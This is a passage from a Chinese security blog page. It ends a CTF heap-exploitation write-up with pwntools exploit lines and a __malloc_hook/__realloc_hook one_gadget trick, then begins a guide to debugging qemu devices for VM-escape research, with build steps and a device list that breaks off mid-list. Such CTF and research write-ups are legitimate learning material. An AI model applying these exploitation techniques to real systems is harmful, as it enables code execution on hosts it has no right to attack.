class="number">-0x133</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"stack\t"</span>+hex(stack<span class="number">-0x183</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'name :'</span>,str(<span class="number">0x68</span>))</span><br><span class="line">sh.sendafter(<span class="string">'flower :'</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="利用-realloc-hook"><a href="#利用-realloc-hook" class="headerlink" title="利用_realloc_hook"></a>利用_realloc_hook</h4><p>参考网上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">地址上*__malloc_hook*与*__realloc_hook*是相邻的，在攻击malloc_hook我们没有能够成功执行one_gadgets，但是我们可以通过将*__malloc_hook*更改为`_libc_realloc+0x20`,将*__realloc_hook*更该为one_gadgets。</span><br><span class="line"></span><br><span class="line">这样的好处在于，我们能够控制*__malloc_hook*指向的代码的内容，规避掉*_libc_realloc*中部分指令，从而更改在执行one_gadgets时的占空间，创建能够成功执行one_gadgets的栈空间。这是一个很巧妙的点…MAGIC！</span><br></pre></td></tr></table></figure>

<p><img src="//idongxia.github.io/2018/09/29/secretgarden/checksec.png" alt="test"></p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://idongxia.github.io/2018/07/19/qemu/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="idongxia">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="idongxia">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2018/07/19/qemu/" class="post-title-link" itemprop="url">How to debug qemu devices</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2018-07-19 12:00:00" itemprop="dateCreated datePublished" datetime="2018-07-19T12:00:00+08:00">2018-07-19</time>
            

            
          </span>

          

          
            
            
              
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
            
                <span class="post-meta-item-text">Kommentare: </span>
                <a href="/2018/07/19/qemu/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2018/07/19/qemu/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="How-to-debug-qemu-devices"><a href="#How-to-debug-qemu-devices" class="headerlink" title="How to debug qemu devices"></a>How to debug qemu devices</h1><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>qemu是一个开源的模拟处理器硬件设备的全虚拟化仿真器和虚拟器.</p>
<p>KVM(kernel virtual machine)是一个Linux内核模块,为用户层提供硬件虚拟化的特性,QEMU通过kvm模拟一个目标架构的时候,可以实现与主机相同的架构,从而极大提高模拟效率。</p>
<h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><p>要想实现从虚拟机里(以后统称guest主机)影响qemu,继而影响用户的主机(以后统称Host主机),就需要找到Guest主机与qemu通信的方法,再通过分析qemu对虚拟机传递数据的处理流程来发掘可利用点,比如虚拟机内传递一个异常值,导致qemu堆溢出,然后利用虚拟机传递布置的内容构造exploit,就可以实现控制qemu完成任意代码执行了。</p>
<h2 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h2><p>首先我们下载最新版的qemu：<a href="http://www.qemu.org/" target="_blank" rel="noopener">下载地址</a></p>
<p>如果使用物理机上的linux作为host最好，但是如果主机是windows，我们也可以采用windows上安装ubuntu虚拟机，然后ubuntu虚拟机中运行qemu来启动vm。 在window上vmware 12上安装ubuntu最新版本(之所以选用最新版本)，然后在ubuntu上编译安装qemu源码，以便后续调试qemu。</p>
<h3 id="编译qemu"><a href="#编译qemu" class="headerlink" title="编译qemu:"></a><strong>编译qemu:</strong></h3><p>./configure –prefix=/usr –target-list=x86_64-softmmu –enable-kvm  –enable-debug –enable-debug-info –enable-modules –enable-vnc  –enable-trace-backends=log –disable-werror –disable-strip</p>
<blockquote>
<ul>
<li>–target-list=x86_64-softmmu 只编译qemu x86_64版本</li>
<li>–enable-kvm 开启qemu内核支持</li>
<li>–enable-debug –enable-debug-info 保留qemu调试信息</li>
<li>–disable-strip 保留qemu程序符号表,以便程序后续gdb调试与IDA逆向分析</li>
</ul>
</blockquote>
<blockquote>
<p>configure过程可能出现缺少依赖的情况，比如zlib, glib-2.22,gthread-2.0等，可以通过以下命令安装所需的依赖  sudo apt-get install zlib1g-dev libglib2.0-dev libpixman-1-dev libfdt-dev (安装依赖后重新configure)</p>
</blockquote>
<p>make -j 16(多线程编译，节省时间)</p>
<p>sudo make install</p>
<h3 id="制作镜像："><a href="#制作镜像：" class="headerlink" title="制作镜像："></a><strong>制作镜像：</strong></h3><ol>
<li>qemu-img create -f qcow2 ubuntu64.img 15G 制作空的磁盘文件</li>
<li>在官网下载ubuntu_xxx.iso镜像</li>
<li>将iso镜像安装到img磁盘文件中，脚本： <strong>qemu-system-x86_64 -enable-kvm -smp 4 -m 2048 -hda ./ubuntu64.img -boot d -cdrom ./ubuntu-16.04.2-desktop-amd64.iso</strong></li>
</ol>
<blockquote>
<ul>
<li>-enable-kvm 开启内核支持，加快qemu运行效率</li>
<li>-cdrom ./ubuntu-16.04.2-desktop-amd64.iso iso挂载到光驱</li>
<li>-hda ./ubuntu64.img  指定磁盘文件</li>
<li>-boot d 从光驱启动</li>
</ul>
</blockquote>
<p>如果没有配置kvm，会找不到kvm驱动，主机与vmware配置如下：</p>
<ol>
<li>确定CPU支持虚拟化后，要在BIOS中开启虚拟化，我的CPU是Intel的，BIOS是这样的：选Security, 再进Virtualization项，把各项设置成ENABLE，保存退出 。</li>
<li>打开vmware的虚拟化引擎，如图： <img src="/qemu/vmware.png" alt="vmare配置选项"></li>
<li>然后可以看到qemu启动，ubuntu启动界面，安装正常安装ubuntu系统安装即可。(PS: 电脑性能不够，在虚拟机里面运行虚拟机比较慢)</li>
</ol>
<h2 id="运行vm-确定目标设备"><a href="#运行vm-确定目标设备" class="headerlink" title="运行vm(确定目标设备)"></a>运行vm(确定目标设备)</h2><p>安装成功后，接下来启动vm，当然启动vm时，就有很多种的选择，特别是在设备的选择上，在host上输入 qemu-system-x86_64 -device ?</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br></pre></td><td class="code"><pre><span class="line">$ qemu-system-x86_64 -device ?</span><br><span class="line">Controller/Bridge/Hub devices:</span><br><span class="line">name &quot;i82801b11-bridge&quot;, bus PCI</span><br><span class="line">name &quot;ioh3420&quot;, bus PCI, desc &quot;Intel IOH device id 3420 PCIE Root Port&quot;</span><br><span class="line">name &quot;isabus-bridge&quot;, bus System</span><br><span class="line">name &quot;pci-bridge&quot;, bus PCI, desc &quot;Standard PCI Bridge&quot;</span><br><span class="line">name &quot;pci-bridge-seat&quot;, bus PCI, desc &quot;Standard PCI Bridge (multiseat)&quot;</span><br><span class="line">name &quot;pcie-root-port&quot;, bus PCI, desc &quot;PCI Express Root Port&quot;</span><br><span class="line">name &quot;pxb&quot;, bus PCI, desc &quot;PCI Expander Bridge&quot;</span><br><span class="line">name &quot;pxb-pcie&quot;, bus PCI, desc &quot;PCI Express Expander Bridge&quot;</span><br><span class="line">name &quot;usb-hub&quot;, bus usb-bus</span><br><span class="line">name &quot;vfio-pci-igd-lpc-bridge&quot;, bus PCI, desc &quot;VFIO dummy ISA/LPC bridge for IGD assignment&quot;</span><br><span class="line">name &quot;x3130-upstream&quot;, bus PCI, desc &quot;TI X3130 Upstream Port of PCI Express Switch&quot;</span><br><span class="line">name &quot;xio3130-downstream&quot;, bus PCI, desc &quot;TI X3130 Downstream Port of PCI Express Switch&quot;</span><br><span class="line"></span><br><span class="line">USB devices:</span><br><span class="line">name &quot;ich9-usb-ehci1&quot;, bus PCI</span><br><span class="line">name &quot;ich9-usb-ehci2&quot;, bus PCI</span><br><span class="line">name &quot;ich9-usb-uhci1&quot;, bus PCI</span><br><span class="line">name &quot;ich9-usb-uhci2&quot;, bus PCI</span><br><span class="line">name &quot;ich9-usb-uhci3&quot;, bus PCI</span><br><span class="line">name &quot;ich9-usb-uhci4&quot;, bus PCI</span><br><span class="line">name &quot;ich9-usb-uhci5&quot;, bus PCI</span><br><span class="line">name &quot;ich9-usb-uhci6&quot;, bus PCI</span><br><span class="line">name &quot;nec-usb-xhci&quot;, bus PCI</span><br><span class="line">name &quot;pci-ohci&quot;, bus PCI, desc &quot;Apple USB Controller&quot;</span><br><span class="line">name &quot;piix3-usb-uhci&quot;, bus PCI</span><br><span class="line">name &quot;piix4-usb-uhci&quot;, bus PCI</span><br><span class="line">name &quot;qemu-xhci&quot;, bus PCI</span><br><span class="line">name &quot;sysbus-ohci&quot;, bus System, desc &quot;OHCI USB Controller&quot;</span><br><span class="line">name &quot;usb-ehci&quot;, bus PCI</span><br><span class="line">name &quot;vt82c686b-usb-uhci&quot;, bus PCI</span><br><span class="line"></span><br><span class="line">Storage devices:</span><br><span class="line">name &quot;allwinner-ahci&quot;, bus System</span><br><span class="line">name &quot;am53c974&quot;, bus PCI, desc &quot;AMD Am53c974 PCscsi-PCI SCSI adapter&quot;</span><br><span class="line">name &quot;cfi.pflash01&quot;, bus System</span><br><span class="line">name &quot;dc390&quot;, bus PCI, desc &quot;Tekram DC-390 SCSI adapter&quot;</span><br><span class="line">name &quot;esp&quot;, bus System</span><br><span class="line">name &quot;floppy&quot;, bus floppy-bus, desc &quot;virtual floppy drive&quot;</span><br><span class="line">name &quot;ich9-ahci&quot;, bus PCI, alias &quot;ahci&quot;</span><br><span class="line">name &quot;ide-cd&quot;, bus IDE, desc &quot;virtual IDE CD-ROM&quot;</span><br><span class="line">name &quot;ide-drive&quot;, bus IDE, desc &quot;virtual IDE disk or CD-ROM (legacy)&quot;</span><br><span class="line">name &quot;ide-hd&quot;, bus IDE, desc &quot;virtual IDE disk&quot;</span><br><span class="line">name &quot;isa-fdc&quot;, bus ISA</span><br><span class="line">name &quot;isa-ide&quot;, bus ISA</span><br><span class="line">name &quot;lsi53c810&quot;, bus PCI</span><br><span class="line">name &quot;lsi53c895a&quot;, bus PCI, alias &quot;lsi&quot;</span><br><span class="line">name &quot;megasas&quot;, bus PCI, desc &quot;LSI MegaRAID SAS 1078&quot;</span><br><span class="line">name &quot;megasas-gen2&quot;, bus PCI, desc &quot;LSI MegaRAID SAS 2108&quot;</span><br><span class="line">name &quot;nvme&quot;, bus PCI, desc &quot;Non-Volatile Memory Express&quot;</span><br><span class="line">name &quot;piix3-ide&quot;, bus PCI</span><br><span class="line">name &quot;piix3-ide-xen&quot;, bus PCI</span><br><span class="line">name &quot;piix4-ide&quot;, bus PCI</span><br><span class="line">name &quot;pvscsi&quot;, bus PCI</span><br><span class="line">name &quot;scsi-block&quot;, bus SCSI, desc &quot;SCSI block device passthrough&quot;</span><br><span class="line">name &quot;scsi-cd&quot;, bus SCSI, desc &quot;virtual SCSI CD-ROM&quot;</span><br><span class="line">name &quot;scsi-disk&quot;, bus SCSI, desc &quot;virtual SCSI disk or CD-ROM (legacy)&quot;</span><br><span class="line">name &quot;scsi-generic&quot;, bus SCSI, desc &quot;pass through generic scsi device (/dev/sg*)&quot;</span><br><span class="line">name &quot;scsi-hd&quot;, bus SCSI, desc &quot;virtual SCSI disk&quot;</span><br><span class="line">name &quot;sdhci-pci&quot;, bus PCI</span><br><span class="line">name &quot;SUNW,fdtwo&quot;, bus System</span><br><span class="line">name &quot;sysbus-ahci&quot;, bus System</span><br><span class="line">name &quot;sysbus-fdc&quot;, bus System</span><br><span class="line">name &quot;usb-bot&quot;, bus usb-bus</span><br><span class="line">name &quot;usb-mtp&quot;, bus usb-bus, desc &quot;USB Media Transfer Protocol device&quot;</span><br><span class="line">name &quot;usb-storage&quot;, bus usb-bus</span><br><span class="line">name &quot;usb-uas&quot;, bus usb-bus</span><br><span class="line">name &quot;vhost-scsi&quot;, bus virtio-bus</span><br><span class="line">name &quot;vhost-scsi-pci&quot;, bus PCI</span><br><span class="line">name &quot;virtio-blk-device&quot;, bus virtio-bus</span><br><span class="line">name &quot;virtio-blk-pci&quot;, bus PCI, alias &quot;virtio-blk&quot;</span><br><span class="line">name &quot;virtio-scsi-device&quot;, bus virtio-bus</span><br><span class="line">name &quot;virtio-scsi-pci&quot;, bus PCI, alias &quot;virtio-scsi&quot;</span><br><span class="line"></span><br><span class="line">Network devices:</span><br><span class="line">name &quot;e1000&quot;, bus PCI, alias &quot;e1000-82540em&quot;, desc &quot;Intel Gigabit Ethernet&quot;</span><br><span class="line">name &quot;e1000-82544gc&quot;, bus PCI, desc &quot;Intel Gigabit Ethernet&quot;</span><br><span class="line">name &quot;e1000-82545em&quot;, bus PCI, desc &quot;Intel Gigabit Ethernet&quot;</span><br><span class="line">name &quot;e1000e&quot;, bus PCI, desc &quot;Intel 82574L GbE Controller&quot;</span><br><span class="line">name &quot;i82550&quot;, bus PCI, desc &quot;Intel i82550 Ethernet&quot;</span><br><span class="line">name &quot;i82551&quot;, bus PCI, desc &quot;Intel i82551 Ethernet&quot;</span><br><span class="line">name &quot;i82557a&quot;, bus PCI, desc &quot;Intel i82557A Ethernet&quot;</span><br><span class="line">name &quot;i82557b&quot;, bus PCI, desc &quot;Intel i82557B Ethernet&quot;</span><br><span class="line">name &quot;i82557c&quot;, bus PCI, desc &quot;Intel i82557C Ethernet&quot;</span><br><span class="line">name &quot;i82558a&quot;, bus PCI, desc &quot;Intel i82558A Ethernet&quot;</span><br><span class="line">name &quot;i82558b&quot;, bus PCI, desc &quot;Intel i82558B Ethernet&quot;</span><br><span class="line">name &quot;i82559a&quot;, bus PCI, desc &quot;Intel i82559A Ethernet&quot;</span><br><span class="line">name &quot;i82559b&quot;, bus PCI, desc &quot;Intel i82559B Ethernet&quot;</span><br><span class="line">name &quot;i82559c&quot;, bus PCI, desc &quot;Intel i82559C Ethernet&quot;</span><br><span class="line">name &quot;i82559er&quot;, bus PCI, desc &quot;Intel i82559ER Ethernet&quot;</span><br><span class="line">name &quot;i82562&quot;, bus PCI, desc &quot;Intel i82562 Ethernet&quot;</span><br><span class="line">name &quot;i82801&quot;, bus PCI, desc &quot;Intel i82801 Ethernet&quot;</span><br><span class="line">name &quot;ne2k_isa&quot;, bus ISA</span><br><span class="line">name &quot;ne2k_pci&quot;, bus PCI</span><br><span class="line">name &quot;pcnet&quot;, bus PCI</span><br><span class="line">name &quot;rocker&quot;, bus PCI, desc &quot;Rocker Switch&quot;</span><br><span class="line">name &quot;rtl8139&quot;, bus PCI</span><br><span class="line">name &quot;usb-bt-dongle&quot;, bus usb-bus</span><br><span class="line">name &quot;usb-net&quot;, bus usb-bus</span><br><span class="line">name &quot;virtio-net-device&quot;, bus virtio-bus</span><br><span class="line">name &quot;virtio-net-pci&quot;, bus PCI, alias &quot;virtio-net&quot;</span><br><span class="line">name &quot;vmxnet3&quot;, bus PCI, desc &quot;VMWare Paravirtualized Ethernet v3&quot;</span><br><span class="line"></span><br><span class="line">Input devices:</span><br><span class="line">name &quot;ipoctal232&quot;, bus IndustryPack, desc &quot;GE IP-Octal 232 8-channel RS-232 IndustryPack&quot;</span><br><span class="line">name &quot;isa-parallel&quot;, bus ISA</span><br><span class="line">name &quot;isa-serial&quot;, bus ISA</span><br><span class="line">name &quot;pci-serial&quot;, bus PCI</span><br><span class="line">name &quot;pci-serial-2x&quot;, bus PCI</span><br><span class="line">name &quot;pci-serial-4x&quot;, bus PCI</span><br><span class="line">name &quot;tpci200&quot;, bus PCI, desc &quot;TEWS TPCI200 IndustryPack carrier&quot;</span><br><span class="line">name &quot;usb-braille&quot;, bus usb-bus</span><br><span class="line">name &quot;usb-ccid&quot;, bus usb-bus, desc &quot;CCID Rev 1.1 smartcard reader&quot;</span><br><span class="line">name &quot;usb-kbd&quot;, bus usb-bus</span><br><span class="line">name &quot;usb-mouse&quot;, bus usb-bus</span><br><span class="line">name &quot;usb-serial&quot;, bus usb-bus</span><br><span class="line">name &quot;usb-tablet&quot;, bus usb-bus</span><br><span class="line">name &quot;usb-wacom-tablet&quot;, bus usb-bus, desc &quot;QEMU PenPartner Tablet&quot;</span><br><span class="line">name &quot;virtconsole&quot;, bus virtio-serial-bus</span><br><span class="line">name &quot;virtio-input-host-device&quot;, bus virtio-bus</span><br><span class="line">name &quot;virtio-input-host-pci&quot;, bus PCI, alias &quot;virtio-input-host&quot;</span><br><span class="line">name &quot;virtio-keyboard-device&quot;, bus virtio-bus</span><br><span class="line">name &quot;virtio-keyboard-pci&quot;, bus PCI, alias &quot;virtio-keyboard&quot;</span><br><span class="line">name &quot;virtio-mouse-device&quot;, bus virtio-bus</span><br><span class="line">name &quot;virtio-mouse-pci&quot;, bus PCI, alias &quot;virtio-mouse&quot;</span><br><span class="line">name &quot;virtio-serial-device&quot;, bus virtio-bus</span><br><span class="line">name &quot;virtio-serial-pci&quot;, bus PCI, alias &quot;virtio-serial&quot;</span><br><span class="line">name &quot;virtio-tablet-device&quot;, bus virtio-bus</span><br><span class="line">name &quot;virtio-tablet-pci&quot;, bus PCI, alias &quot;virtio-tablet&quot;</span><br><span class="line">name &quot;virtserialport&quot;, bus virtio-serial-bus</span><br><span class="line"></span><br><span class="line">Display devices:</span><br><span class="line">name &quot;cirrus-vga&quot;, bus PCI, desc &quot;Cirrus CLGD 54xx VGA&quot;</span><br><span class="line">name &quot;isa-cirrus-vga&quot;, bus ISA</span><br><span class="line">name &quot;isa-vga&quot;, bus ISA</span><br><span class="line">name &quot;secondary-vga&quot;, bus PCI</span><br><span class="line">name &quot;sga&quot;, bus ISA, desc &quot;Serial Graphics Adapter&quot;</span><br><span class="line">name &quot;VGA&quot;, bus PCI</span><br><span class="line">name &quot;virtio-gpu-pci&quot;, bus PCI, alias &quot;virtio-gpu&quot;</span><br><span class="line">name &quot;virtio-vga&quot;, bus PCI</span><br><span class="line">name &quot;vmware-svga&quot;, bus PCI</span><br><span class="line"></span><br><span class="line">Sound devices:</span><br><span class="line">name &quot;AC97&quot;, bus PCI, desc &quot;Intel 82801AA AC97 Audio&quot;</span><br><span class="line">name &quot;adlib&quot;, bus ISA, desc &quot;Yamaha YM3812 (OPL2)&quot;</span><br><span class="line">name &quot;cs4231a&quot;, bus ISA, desc &quot;Crystal Semiconductor CS4231A&quot;</span><br><span class="line">name &quot;ES1370&quot;, bus PCI, desc &quot;ENSONIQ AudioPCI ES1370&quot;</span><br><span class="line">name &quot;gus&quot;, bus ISA, desc &quot;Gravis Ultrasound GF1&quot;</span><br><span class="line">name &quot;hda-duplex&quot;, bus HDA, desc &quot;HDA Audio Codec, duplex (line-out, line-in)&quot;</span><br><span class="line">name &quot;hda-micro&quot;, bus HDA, desc &quot;HDA Audio Codec, duplex (speaker, microphone)&quot;</span><br><span class="line">name &quot;hda-output&quot;, bus HDA, desc &quot;HDA Audio Codec, output-only (line-out)&quot;</span><br><span class="line">name &quot;ich9-intel-hda&quot;, bus PCI, desc &quot;Intel HD Audio Controller (ich9)&quot;</span><br><span class="line">name &quot;intel-hda&quot;, bus PCI, desc &quot;Intel HD Audio Controller (ich6)&quot;</span><br><span class="line">name &quot;sb16&quot;, bus ISA, desc &quot;Creative Sound Blaster 16&quot;</span><br><span class="line">name &quot;usb-audio&quot;, bus usb-bus</span><br><span class="line"></span><br><span class="line">Misc devices:</span><br><span class="line">name &quot;hyperv-testdev&quot;, bus ISA</span><br><span class="line">name &quot;i6300esb&quot;, bus PCI</span><br><span class="line">name &quot;ib700&quot;, bus ISA</span><br><span class="line">name &quot;isa-applesmc&quot;, bus ISA</span><br><span class="line">name &quot;isa-debug-exit&quot;, bus ISA</span><br><span class="line">name &quot;isa-debugcon&quot;, bus ISA</span><br><span class="line">name &quot;ivshmem&quot;, bus PCI, desc &quot;Inter-VM shared memory (legacy)&quot;</span><br><span class="line">name &quot;ivshmem-doorbell&quot;, bus PCI, desc &quot;Inter-VM shared memory&quot;</span><br><span class="line">name &quot;ivshmem-plain&quot;, bus PCI, desc &quot;Inter-VM shared memory&quot;</span><br><span class="line">name &quot;kvm-pci-assign&quot;, bus PCI, alias &quot;pci-assign&quot;, desc &quot;KVM-based PCI passthrough&quot;</span><br><span class="line">name &quot;pc-testdev&quot;, bus ISA</span><br><span class="line">name &quot;pci-testdev&quot;, bus PCI, desc &quot;PCI Test Device&quot;</span><br><span class="line">name &quot;pvpanic&quot;, bus ISA</span><br><span class="line">name &quot;vfio-pci&quot;, bus PCI, desc &quot;VFIO-based PCI device assignment&quot;</span><br><span class="line">name &quot;vhost-vsock-device&quot;, bus virtio-bus</span><br><span class="line">name &quot;vhost-vsock-pci&quot;, bus PCI</span><br><span class="line">name &quot;virtio-balloon-device&quot;, bus virtio-bus</span><br><span class="line">name &quot;virtio-balloon-pci&quot;, bus PCI, alias &quot;virtio-balloon&quot;</span><br><span class="line">name &quot;virtio-crypto-device&quot;, bus virtio-bus</span><br><span class="line">name &quot;virtio-crypto-pci&quot;, bus PCI</span><br><span class="line">name &quot;virtio-mmio&quot;, bus System</span><br><span class="line">name &quot;virtio-rng-device&quot;, bus virtio-bus</span><br><span class="line">name &quot;virtio-rng-pci&quot;, bus PCI, alias &quot;virtio-rng&quot;</span><br><span class="line"></span><br><span class="line">CPU devices:</span><br><span class="line">name &quot;486-x86_64-cpu&quot;</span><br><span class="line">name &quot;athlon-x86_64-cpu&quot;</span><br><span class="line">name &quot;base-x86_64-cpu&quot;</span><br><span class="line">name &quot;Broadwell-noTSX-x86_64-cpu&quot;</span><br><span class="line">name &quot;Broadwell-x86_64-cpu&quot;</span><br><span class="line">name &quot;Conroe-x86_64-cpu&quot;</span><br><span class="line">name &quot;core2duo-x86_64-cpu&quot;</span><br><span class="line">name &quot;coreduo-x86_64-cpu&quot;</span><br><span class="line">name &quot;Haswell-noTSX-x86_64-cpu&quot;</span><br><span class="line">name &quot;Haswell-x86_64-cpu&quot;</span><br><span class="line">name &quot;host-x86_64-cpu&quot;</span><br><span class="line">name &quot;IvyBridge-x86_64-cpu&quot;</span><br><span class="line">name &quot;kvm32-x86_64-cpu&quot;</span><br><span class="line">name &quot;kvm64-x86_64-cpu&quot;</span><br><span class="line">name &quot;max-x86_64-cpu&quot;</span><br><span class="line">name &quot;n270-x86_64-cpu&quot;</span><br><span class="line">name &quot;Nehalem-x86_64-cpu&quot;</span><br><span class="line">name &quot;Opteron_G1-x86_64-cpu&quot;</span><br><span class="line">name &quot;Opteron_G2-x86_64-cpu&quot;</span><br><span class="line">name &quot;Opteron_G3-x86_64-cpu&quot;</span><br><span class="line">name &quot;Opteron_G4-x86_64-cpu&quot;</span><br><span class="line">name &quot;Opteron_G5-x86_64-cpu&quot;</span><br><span class="line">name &quot;Penryn-x86_64-cpu&quot;</span><br><span class="line">name &quot;pentium-x86_64-cpu&quot;</span><br><span class="line">name &quot;pentium2-x86_64-cpu&quot;</span><br><span class="line">name &quot;pentium3-x86_64-cpu&quot;</span><br><span class="line">name &quot;phenom-x86_64-cpu&quot;</span><br><span class="line">name &quot;qemu32-x86_64-cpu&quot;</span><br><span class="line">name &quot;qemu64-x86_64-cpu&quot;</span><br><span class="line">name &quot;SandyBridge-x86_64-cpu&quot;</span><br><span class="line">name &quot;Skylake-Client-x86_64-cpu&quot;</span><br><span class="line">name &quot;Westmere-x86_64-cpu&quot;</span><br><span class="line"></span><br><span class="line">Uncategorized devices:</span><br><span class="line">name &quot;amd-iommu&quot;, bus System</span><br><span class="line">name &quot;AMDVI-PCI&quot;, bus 